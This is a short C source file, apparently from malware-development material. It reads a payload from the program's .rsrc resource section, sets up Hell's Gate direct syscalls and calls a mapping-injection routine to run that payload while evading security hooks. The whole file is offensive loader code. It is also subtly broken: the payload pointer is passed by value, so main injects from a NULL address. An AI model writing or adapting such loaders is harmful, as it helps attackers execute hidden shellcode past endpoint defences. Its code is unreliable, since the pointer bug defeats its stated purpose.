#include "Resource.h"
#include "HellsGate.h"

BOOL GetPayloadFromResource(OUT PVOID pPayloadAddress, OUT SIZE_T* pPayloadSize) {
	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;

	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Get the size of our payload in .rsrc section
	*pPayloadSize = SizeofResource(NULL, hRsrc);
	if (*pPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main() {
	PVOID pPayloadAddress = NULL;
	SIZE_T sPayloadSize = 0;

	if (GetPayloadFromResource(pPayloadAddress, &sPayloadSize) != TRUE) {
		printf("[!] Failed To Get Payload From The Resource Section\n");
		return -1;
	}

	InitializeSyscalls();
	RemoteMappingInjectionViaSyscalls(
		GetCurrentProcessHandle(),
		pPayloadAddress,
		sPayloadSize,
		TRUE
	);

	return 0;
}